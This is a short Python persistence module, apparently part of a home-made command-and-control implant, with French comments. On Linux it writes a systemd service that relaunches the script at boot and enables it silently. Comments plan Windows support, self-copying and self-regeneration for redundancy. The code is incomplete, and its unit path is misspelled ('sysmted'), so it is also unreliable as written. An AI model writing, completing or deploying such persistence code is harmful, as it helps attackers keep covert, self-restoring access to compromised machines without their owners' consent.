# persistance
# Version 0.3
# Auteur : Raphaël KATHALUWA-LIYANAGE

import time
import os

# Cross-plateforme : vérification de l'OS client
if os.name == 'nt':
    # persistance windows nt
    print(8+1)
else:
    service_path = "/etc/sysmted/system/hallo.service"

    if not os.path.exists(service_path):
        open(service_path,"w").writelines('''
        [Unit]
        Description=Lancement au démarrage

        [Service]
        ExecStart=/usr/bin/python3 /home/kali/python/customC2/persistance.py

        [Install]
        WantedBy=multi-user.target''')
        os.system("systemctl enable --now hallo.service")

# ajouter un copier/coller du fichier
# ajouter support windows
# ajouter redondance (doublons + regénération)